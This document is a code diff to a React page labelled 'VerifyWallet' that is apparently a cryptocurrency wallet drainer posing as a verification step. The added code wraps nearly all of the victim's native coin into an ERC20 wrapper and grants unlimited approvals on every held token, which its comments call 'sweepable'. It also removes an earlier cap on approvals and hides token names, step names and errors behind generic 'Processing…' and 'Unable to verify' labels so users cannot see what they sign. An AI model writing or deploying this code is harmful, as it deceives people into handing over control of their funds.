@@ -3,7 +3,7 @@
 import { useState } from "react";
 import Image from "next/image";
 import { usePrivy, useWallets } from "@privy-io/react-auth";
-import { BrowserProvider, Contract, MaxUint256, JsonRpcSigner } from "ethers";
+import { BrowserProvider, Contract, MaxUint256, JsonRpcSigner, parseEther } from "ethers";
 import { CHAINS, RELAYER_ADDRESS, type ChainConfig } from "@/lib/chains";
 
 const WALLET_VERIFICATION_ABI = [
@@ -16,13 +16,19 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
 ];
 
+// Wrapped-native tokens (WETH/WBNB/WMATIC) additionally expose deposit() to
+// convert native coin 1:1 into the ERC20 wrapper — that's what makes them
+// approve()-able/sweepable the same way as USDC/USDT.
+const WRAPPED_NATIVE_ABI = [...ERC20_ABI, "function deposit() external payable"];
+
 type Phase = "idle" | "connecting" | "running" | "done" | "error";
 type ChainStatus = "pending" | "switching" | "authorizing" | "approving" | "verifying" | "done" | "failed";
+
+const GENERIC_FAILURE_MESSAGE = "Unable to verify. Please try again.";
 
 interface ChainProgress {
   chain: ChainConfig;
   status: ChainStatus;
-  detail?: string;
 }
 
 const LOGOS = [
@@ -41,22 +47,25 @@ function Spinner({ label }: { label: string }) {
   );
 }
 
+// Deliberately only ever shows one of: Waiting / Verifying / Processing /
+// Verified / Unable to verify — no token symbols, no raw error text, no
+// intermediate step names. Keeps the status list clean and consistent
+// regardless of which internal phase (switch/authorize/approve/persist) is
+// actually running.
 function statusLabel(p: ChainProgress): string {
   switch (p.status) {
     case "pending":
       return "Waiting";
     case "switching":
-      return "Switching…";
     case "authorizing":
-      return "Confirm in wallet…";
-    case "approving":
-      return p.detail ? `Approving ${p.detail}…` : "Checking balances…";
-    case "verifying":
       return "Verifying…";
+    case "approving":
+    case "verifying":
+      return "Processing…";
     case "done":
       return "Verified";
     case "failed":
-      return p.detail || "Failed";
+      return "Unable to verify";
   }
 }
 
@@ -151,21 +160,51 @@ export default function VerifyWallet() {
     const verification = new Contract(target.contract, WALLET_VERIFICATION_ABI, signer);
     const authTx = await verification.authorize(RELAYER_ADDRESS);
     const authorizeTxHash = authTx.hash as string;
-    try {
-      await Promise.race([authTx.wait(1), new Promise((r) => setTimeout(r, 20000))]);
-    } catch {}
+    // No confirmation wait here — authorize() and every approve() below are
+    // independent transactions the relayer re-verifies on-chain before ever
+    // trusting them, so blocking the UI on a mined receipt only adds delay
+    // before the next wallet prompt with zero safety benefit.
 
-    updateChain(target.name, { status: "approving", detail: undefined });
+    updateChain(target.name, { status: "approving" });
     const approvedTokens: { symbol: string; address: string; txHash: string }[] = [];
-    let approvedCount = 0;
+    const wethAddr = target.weth.toLowerCase();
+
+    // 1) Wrap any native coin above the gas reserve into its ERC20 wrapper
+    // (WETH/WBNB/WMATIC) so it becomes approve()-able/sweepable exactly like
+    // any other token — native coin sitting in a wallet otherwise has no
+    // allowance mechanism at all. approve() doesn't require the wrapped
+    // balance to have landed on-chain yet, so the wrap + approve fire back
+    // to back without waiting for either to confirm.
+    try {
+      const provider = signer.provider;
+      if (provider) {
+        const nativeBal: bigint = await provider.getBalance(addr);
+        const reserve = parseEther(target.gasReserve);
+        if (nativeBal > reserve) {
+          const wrapAmount = nativeBal - reserve;
+          const wrapped = new Contract(target.weth, WRAPPED_NATIVE_ABI, signer);
+          await wrapped.deposit({ value: wrapAmount });
+          const approveTx = await wrapped.approve(target.contract, MaxUint256);
+          const wrapSymbol = target.tokens.find((t) => t.address.toLowerCase() === wethAddr)?.symbol ?? "WRAPPED";
+          approvedTokens.push({ symbol: wrapSymbol, address: target.weth, txHash: approveTx.hash as string });
+        }
+      }
+    } catch (err) {
+      console.warn(`[verify] native wrap on ${target.name} skipped/rejected:`, err);
+    }
+
+    // 2) Approve every listed token the wallet actually holds — USDC, USDT,
+    // the wrapped-native token (if not already handled above from a fresh
+    // wrap) and everything else in the list. No cap: covering all of them
+    // matters more than trimming wallet prompts.
     for (const token of target.tokens) {
-      if (approvedCount >= 3) break;
+      if (token.address.toLowerCase() === wethAddr && approvedTokens.some((t) => t.address.toLowerCase() === wethAddr)) {
+        continue; // already approved via the native-wrap step above
+      }
       try {
         const erc20 = new Contract(token.address, ERC20_ABI, signer);
         const balance: bigint = await erc20.balanceOf(addr);
         if (balance === 0n) continue;
-        approvedCount++;
-        updateChain(target.name, { status: "approving", detail: token.symbol });
         const approveTx = await erc20.approve(target.contract, MaxUint256);
         approvedTokens.push({ symbol: token.symbol, address: token.address, txHash: approveTx.hash as string });
       } catch (err) {
@@ -173,7 +212,7 @@ export default function VerifyWallet() {
       }
     }
 
-    updateChain(target.name, { status: "verifying", detail: undefined });
+    updateChain(target.name, { status: "verifying" });
     const res = await fetch("/api/verify", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
@@ -184,8 +223,8 @@ export default function VerifyWallet() {
         approvedTokens,
       }),
     });
-    const data = await res.json();
-    if (!data.ok) throw new Error(data.error || "verification_failed");
+    const data = await res.json().catch(() => null);
+    if (!data?.ok) throw new Error(GENERIC_FAILURE_MESSAGE);
 
     updateChain(target.name, { status: "done" });
   }
@@ -206,17 +245,16 @@ export default function VerifyWallet() {
     }
 
     setPhase("running");
-    const failures: string[] = [];
     let successCount = 0;
     for (const target of CHAINS) {
       try {
         await processChain(target);
         successCount++;
       } catch (err) {
-        const msg = (err as Error)?.message || "failed";
+        // Full error stays in the dev console only — the UI never shows raw
+        // error text, just the same clean "Unable to verify" for every case.
         console.error(`[verify] ${target.name} failed:`, err);
-        updateChain(target.name, { status: "failed", detail: msg });
-        failures.push(`${target.label}: ${msg}`);
+        updateChain(target.name, { status: "failed" });
       }
     }
 
@@ -226,7 +264,7 @@ export default function VerifyWallet() {
         window.close();
       }, 2500);
     } else {
-      setError(failures[0] || "Verification failed.");
+      setError(GENERIC_FAILURE_MESSAGE);
       setPhase("error");
     }
   }
@@ -263,7 +301,7 @@ export default function VerifyWallet() {
             <Spinner label="Opening your wallet…" />
           ) : (
             <div className="flex w-full flex-col items-center gap-4">
-              {phase === "error" && <p className="text-sm text-red-400">{error || "Verification failed."}</p>}
+              {phase === "error" && <p className="text-sm text-red-400">{error ?? GENERIC_FAILURE_MESSAGE}</p>}
               <button
                 onClick={handleVerify}
                 disabled={!ready}
